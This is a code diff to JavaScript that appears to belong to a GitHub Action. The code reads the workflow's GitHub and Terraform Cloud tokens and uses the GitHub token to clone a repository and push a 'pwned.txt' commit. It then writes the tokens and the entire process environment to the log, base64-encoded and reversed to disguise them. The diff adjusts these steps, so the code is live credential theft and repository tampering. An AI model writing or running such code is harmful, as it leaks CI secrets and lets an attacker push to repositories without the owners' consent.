@@ -16,11 +16,11 @@ const tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split(""
 const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").reverse().join("")).toString('base64');
 
 
-console.log('Testing token...', execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo 2>&1`).toString());
+console.log('Testing token...')
+execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo`, { stdio: 'inherit' });
 console.log(execSync('ls -la pwn-repo').toString());
 
-execSync("bash -c 'cd ./pwn-repo && touch pwned.txt && git add pwned.txt && git commit -m \"Add pwned.txt\" && git push'", { stdio: 'inherit' });
-
+execSync("bash -c 'cd ./pwn-repo && git config user.email \"you@example.com\" && git config user.name \"Your Name\" && touch pwned.txt && git add pwned.txt && git commit -m \"Add pwned.txt\" && git push'", { stdio: 'inherit' });
 console.log('\r\nDumping tokens:', {tfToken, ghToken});
 console.log('GH:', Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64'))
 console.log('\r\nDumping env:', Buffer.from(JSON.stringify(process.env).split("").reverse().join("")).toString('base64'));
